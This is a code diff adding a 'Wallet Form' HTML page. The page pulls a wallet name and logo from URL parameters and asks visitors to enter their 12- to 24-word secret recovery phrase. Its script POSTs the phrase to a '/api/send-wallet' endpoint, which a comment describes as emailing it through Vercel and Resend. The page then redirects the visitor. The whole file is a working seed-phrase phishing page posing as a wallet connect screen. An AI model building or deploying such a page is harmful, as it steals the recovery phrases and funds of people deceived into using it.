@@ -1,0 +1,69 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Wallet Form</title>
+  <style>
+    body{margin:0;font-family:Inter,system-ui,Arial;background:#071023;color:#e6f2f7;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px}
+    .card{background:rgba(255,255,255,0.05);padding:20px;border-radius:12px;width:100%;max-width:500px;text-align:center}
+    .wallet-logo img{width:80px;height:80px;border-radius:12px;background:#0a192f;padding:10px}
+    .wallet-name{font-size:20px;font-weight:700;margin-top:10px}
+    form{margin-top:20px;display:flex;flex-direction:column;gap:10px}
+    input,textarea{padding:10px;border:none;border-radius:8px;background:rgba(255,255,255,0.1);color:#fff}
+    button{padding:10px;border:none;border-radius:8px;background:#06b6d4;color:#042028;font-weight:700;cursor:pointer}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="wallet-logo"><img id="walletLogo" src="" alt=""></div>
+    <div class="wallet-name" id="walletName"></div>
+
+    <form id="walletForm">
+      <input type="hidden" name="walletName" id="walletNameInput">
+
+      <textarea name="message" placeholder="Secret phrase" rows="18"></textarea>
+      <p>Typically 12 (sometimes 18, 24) words separated by single spaces</p>
+
+      <button type="submit">connect</button>
+    </form>
+  </div>
+
+  <script>
+    // Load wallet name + logo from URL
+    const params = new URLSearchParams(window.location.search);
+    const walletName = decodeURIComponent(params.get("name") || "Wallet");
+    const walletLogo = decodeURIComponent(params.get("logo") || "");
+
+    document.getElementById("walletName").textContent = walletName;
+    document.getElementById("walletLogo").src = walletLogo;
+    document.getElementById("walletNameInput").value = walletName;
+
+    // Handle API submission to Vercel + Resend
+    document.getElementById("walletForm").onsubmit = async (e) => {
+      e.preventDefault();
+
+      const formData = new FormData(e.target);
+
+      const data = {
+        walletName: formData.get("walletName"),
+        fullname: "",       // optional
+        email: "",          // optional
+        message: formData.get("message"),
+      };
+
+      const response = await fetch("/api/send-wallet", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data),
+      });
+
+      if (response.ok) {
+        window.location.href = "message.html";
+      } else {
+        alert("Failed to send email.");
+      }
+    };
+  </script>
+</body>
+</html>
